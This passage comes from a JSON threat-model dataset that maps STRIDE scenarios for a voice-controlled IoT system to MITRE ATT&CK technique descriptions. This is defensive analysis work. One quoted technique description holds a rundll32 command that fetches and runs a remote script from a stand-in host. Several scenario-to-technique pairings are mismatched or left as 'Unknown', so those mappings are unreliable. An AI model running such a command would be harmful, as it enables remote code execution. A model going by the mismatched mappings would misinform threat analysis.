Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters stored configurations in the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "Access to IoT controller configuration interface",
                    "Role": "Attacker",
                    "Condition": "Weak or compromised credentials."
                },
                {
                    "Assumption": "Insufficient logging and monitoring",
                    "Role": "System",
                    "Condition": "No audit trail for configuration changes."
                },
                {
                    "Assumption": "No physical security controls",
                    "Role": "System",
                    "Condition": "Lack of physical access restrictions."
                }
            ],
            "Potential Impact": "Altered behavior of IoT devices.",
            "MITRE ATT&CK Keywords": [
                "configuration change",
                "iot controller",
                "data tampering",
                "physical access"
            ],
            "mitre_technique": {
                "name": "SNMP (MIB Dump)",
                "description": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5",
                "technique_id": "T1602.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the client-side application to capture user commands and responses.",
            "Assumptions": [
                {
                    "Assumption": "System lacks code integrity checks",
                    "Role": "System",
                    "Condition": "No integrity verification for client-side code."
                },
                {
                    "Assumption": "User downloads compromised application",
                    "Role": "User",
                    "Condition": "Susceptibility to social engineering or malicious sites."
                },
                {
                    "Assumption": "No application whitelisting or sandboxing",
                    "Role": "System",
                    "Condition": "Absence of execution environment controls."
                }
            ],
            "Potential Impact": "Capture of sensitive interactions and commands.",
            "MITRE ATT&CK Keywords": [
                "application tampering",
                "code modification",
                "client-side",
                "credential capture"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies issuing specific voice commands.",
            "Assumptions": [
                {
                    "Assumption": "System logs are not tamper-proof",
                    "Role": "System",
                    "Condition": "Absence of secure logging mechanisms."
                },
                {
                    "Assumption": "No user identity verification",
                    "Role": "System",
                    "Condition": "Voice commands not tied to distinct users."
                },
                {
                    "Assumption": "Insufficient audit trails",
                    "Role": "System",
                    "Condition": "No comprehensive history of user actions."
                }
            ],
            "Potential Impact": "Disputes over command activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "action denial",
                "insufficient logging",
                "audit trails"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes logs to erase their actions.",
            "Assumptions": [
                {
                    "Assumption": "System logs are locally stored",
                    "Role": "System",
                    "Condition": "Centralized logging not implemented."
                },
                {
                    "Assumption": "Insufficient log access controls",
                    "Role": "System",
                    "Condition": "No restrictions on who can modify logs."
                },
                {
                    "Assumption": "No redundancy for logs",
                    "Role": "System",
                    "Condition": "Logs not backed up or mirrored."
                }
            ],
            "Potential Impact": "Loss of audit trails and activity history.",
            "MITRE ATT&CK Keywords": [
                "log deletion",
                "audit trail tampering",
                "logging",
                "repudiation"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user modifies logs to falsify actions.",
            "Assumptions": [
                {
                    "Assumption": "Write access to log files by users",
                    "Role": "User",
                    "Condition": "Inadequate permissions management."
                },
                {
                    "Assumption": "Unchecked log modifications",
                    "Role": "System",
                    "Condition": "No integrity checks on logs."
                },
                {
                    "Assumption": "Absence of centralized monitoring",
                    "Role": "System",
                    "Condition": "No real-time logging analysis."
                }
            ],
            "Potential Impact": "Misinformation about user activities.",
            "MITRE ATT&CK Keywords": [
                "log falsification",
                "audit trail tampering",
                "logging",
                "repudiation"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts voice command data over unencrypted channels.",
            "Assumptions": [
                {
                    "Assumption": "Unencrypted data in transit",
                    "Role": "System",
                    "Condition": "Use of HTTP or other unsecure protocols."
                },
                {
                    "Assumption": "Network traffic is monitorable",
                    "Role": "Attacker",
                    "Condition": "Access to network communication paths."
                },
                {
                    "Assumption": "No data encapsulation methods",
                    "Role": "System",
                    "Condition": "Lack of VPN or SSL/TLS encryption."
                }
            ],
            "Potential Impact": "Sensitive voice commands exposed.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted communication",
                "information disclosure",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to stored user voice data.",
            "Assumptions": [
                {
                    "Assumption": "No encryption of stored data",
                    "Role": "System",
                    "Condition": "Data-at-rest not encrypted."
                },
                {
                    "Assumption": "Inadequate access controls",
                    "Role": "System",
                    "Condition": "Loose permissions on storage systems."
                },
                {
                    "Assumption": "Compromised credentials",
                    "Role": "Attacker",
                    "Condition": "Phished or stolen user credentials."
                }
            ],
            "Potential Impact": "Confidential user data accessed.",
            "MITRE ATT&CK Keywords": [
                "data breach",
                "unauthorized access",
                "stored information",
                "disclosure"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data leakage through verbose error messages in the client-side application.",
            "Assumptions": [
                {
                    "Assumption": "Detailed error messages exposed",
                    "Role": "System",
                    "Condition": "Lack of error message sanitization."
                },
                {
                    "Assumption": "Application does not use generic error reporting",
                    "Role": "System",
                    "Condition": "Descriptive error messages given."
                },
                {
                    "Assumption": "User can access debug information",
                    "Role": "User",
                    "Condition": "Debugging enabled in production."
                }
            ],
            "Potential Impact": "Technical details aiding further attacks revealed.",
            "MITRE ATT&CK Keywords": [
                "error messages",
                "data leakage",
                "client-side",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the microphone with noise to prevent legitimate voice commands.",
            "Assumptions": [
                {
                    "Assumption": "System lacks noise filtering",
                    "Role": "System",
                    "Condition": "Inadequate audio processing algorithms."
                },
                {
                    "Assumption": "Physical proximity to microphone",
                    "Role": "Attacker",
                    "Condition": "Ability to produce loud noises near the device."
                },
                {
                    "Assumption": "No secondary input methods",
                    "Role": "System",
                    "Condition": "Reliance solely on voice commands."
                }
            ],
            "Potential Impact": "Inability to process legitimate commands.",
            "MITRE ATT&CK Keywords": [
                "audio flooding",
                "microphone",
                "voice command disruption",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "The server is overwhelmed by a high volume of voice command requests.",
            "Assumptions": [
                {
                    "Assumption": "No request rate limiting",
                    "Role": "System",
                    "Condition": "Lack of throttling mechanisms."
                },
                {
                    "Assumption": "Server has finite processing capacity",
                    "Role": "System",
                    "Condition": "Resource limitations on the server."
                },
                {
                    "Assumption": "Network bandwidth is limited",
                    "Role": "System",
                    "Condition": "Limited bandwidth allocation for server communication."
                }
            ],
            "Potential Impact": "Server becomes unresponsive to legitimate requests.",
            "MITRE ATT&CK Keywords": [
                "high volume requests",
                "server overload",
                "resource exhaustion",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious payload sent to IoT devices causes system crash.",
            "Assumptions": [
                {
                    "Assumption": "Devices vulnerable to known exploits",
                    "Role": "System",
                    "Condition": "Unpatched firmware or software vulnerabilities."
                },
                {
                    "Assumption": "Malformed commands can be sent without validation",
                    "Role": "System",
                    "Condition": "Lack of input validation."
                },
                {
                    "Assumption": "No automatic recovery mechanisms",
                    "Role": "System",
                    "Condition": "Absence of system restart or recovery protocols."
                }
            ],
            "Potential Impact": "IoT devices become inoperative.",
            "MITRE ATT&CK Keywords": [
                "malicious payload",
                "system crash",
                "iot device",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user exploits a vulnerability in the client-side application to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Existing vulnerability in the application",
                    "Role": "System",
                    "Condition": "Unpatched security flaw."
                },
                {
                    "Assumption": "User has basic access to the client-side application",
                    "Role": "User",
                    "Condition": "Legitimate access credentials."
                },
                {
                    "Assumption": "No input sanitation",
                    "Role": "System",
                    "Condition": "Application fails to validate user inputs."
                }
            ],
            "Potential Impact": "User gains unauthorized administrative controls.",
            "MITRE ATT&CK Keywords": [
                "client-side vulnerability",
                "input sanitization",
                "privilege escalation",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
                "technique_id": "T1574.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains unauthorized access to the IoT controller through an insecure API.",
            "Assumptions": [
                {
                    "Assumption": "IoT controller exposes insecure APIs",
                    "Role": "System",
                    "Condition": "APIs lack authentication or authorization controls."
                },
                {
                    "Assumption": "API documentation publicly accessible",
                    "Role": "System",
                    "Condition": "No restrictions on API documentation access."
                },
                {
                    "Assumption": "Attacker has knowledge of API endpoints",
                    "Role": "Attacker",
                    "Condition": "Reconnaissance on the system."
                }
            ],
            "Potential Impact": "Control over IoT devices without proper authorization.",
            "MITRE ATT&CK Keywords": [
                "api exploitation",
                "unauthorized access",
                "iot controller",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting a vulnerable cloud service integration to gain system-wide access.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services integrated with weak security measures",
                    "Role": "System",
                    "Condition": "Improper configuration or known vulnerabilities."
                },
                {
                    "Assumption": "Insufficient monitoring of cloud service interactions",
                    "Role": "System",
                    "Condition": "Lack of real-time activity tracking."
                },
                {
                    "Assumption": "Shared resources without adequate controls",
                    "Role": "System",
                    "Condition": "Resources accessible by different components without segregation."
                }
            ],
            "Potential Impact": "Compromise and control of the entire system.",
            "MITRE ATT&CK Keywords": [
                "cloud service",
                "system-wide access",
                "vulnerability exploitation",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "10",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Spoofed voice commands are injected into the microphone to trigger unauthorized IoT actions.",
            "Assumptions": [
                {
                    "Assumption": "The microphone can capture audio from untrusted sources.",
                    "Role": "Attacker",
                    "Condition": "When the attacker is within the audio range of the microphone."
                },
                {
                    "Assumption": "No strong authentication mechanism is in place for voice commands.",
                    "Role": "System Designer",
                    "Condition": "System implementation lacks voice recognition."
                },
                {
                    "Assumption": "The system cannot distinguish between authorized and unauthorized voice commands.",
                    "Role": "Application Logic",
                    "Condition": "Limited or no verification of command authenticity."
                }
            ],
            "Potential Impact": "Unauthorized actions executed by IoT devices.",
            "MITRE ATT&CK Keywords": [
                "audio injection",
                "spoofing",
                "IoT devices",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a user from an internet-facing node, sending malicious instructions to the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "The server accepts input from any internet-facing client without additional verification.",
                    "Role": "Network Administrator",
                    "Condition": "Open to all incoming connections."
                },
                {
                    "Assumption": "The client-side application does not have robust methods to prove its identity to the server.",
                    "Role": "Application Developer",
                    "Condition": "Lack of mutually authenticated communication."
                },
                {
                    "Assumption": "Network traffic between the client-side and server-side is not encrypted.",
                    "Role": "System Architect",
                    "Condition": "Absence of effective encryption protocols."
                }
            ],
            "Potential Impact": "Malicious commands executed server-side, leading to unauthorized activities.",
            "MITRE ATT&CK Keywords": [
                "network spoofing",
                "identity spoofing",
                "server-side compromise",
                "unauthenticated access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker exploits a compromised IoT controller to send fake status updates and control commands.",
            "Assumptions": [
                {
                    "Assumption": "IoT controller has weak or no authentication mechanisms.",
                    "Role": "Device Manufacturer",
                    "Condition": "Insufficient device security implementation."
                },
                {
                    "Assumption": "Compromised IoT controller can communicate with IoT devices without checks.",
                    "Role": "Device Manager",
                    "Condition": "Lack of verification protocols."
                },
                {
                    "Assumption": "The attacker gains network access or physically breaches the environment.",
                    "Role": "Security Admin",
                    "Condition": "Unsecured networks or inadequate physical security."
                }
            ],
            "Potential Impact": "Falsified status reporting and control over IoT devices.",
            "MITRE ATT&CK Keywords": [
                "device spoofing",
                "IoT manipulation",
                "network compromise",
                "unauthorized actions"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters command messages between the client-side application and the server.",
            "Assumptions": [
                {
                    "Assumption": "Communication is not encrypted end-to-end.",
                    "Role": "System Architect",
                    "Condition": "Use of plain text communication."
                },
                {
                    "Assumption": "Access to the communication channels is possible for an attacker.",
                    "Role": "Network Security Admin",
                    "Condition": "Compromised network infrastructure."
                },
                {
                    "Assumption": "There are no integrity checks on the messages.",
                    "Role": "Application Developer",
                    "Condition": "Lack of hash/checksum verification."
                }
            ],
            "Potential Impact": "Corruption and unauthorized modification of voice commands and responses.",
            "MITRE ATT&CK Keywords": [
                "traffic interception",
                "message tampering",
                "network manipulation",
                "data alteration"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious software on the client-side tampering with the voice data before sending it to the server.",
            "Assumptions": [
                {
                    "Assumption": "Endpoint security is insufficient or nonexistent.",
                    "Role": "IT Security Admin",
                    "Condition": "Outdated or missing endpoint protection."
                },
                {
                    "Assumption": "Client device security mechanisms can be bypassed.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of and ability to exploit client vulnerabilities."
                },
                {
                    "Assumption": "User unintentionally installs malicious software.",
                    "Role": "End User",
                    "Condition": "Lack of user training and awareness."
                }
            ],
            "Potential Impact": "Integrity of the voice commands is compromised.",
            "MITRE ATT&CK Keywords": [
                "client compromise",
                "data tampering",
                "malware",
                "voice data manipulation"
            ],
            "mitre_technique": {
                "name": "Rundll32",
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe 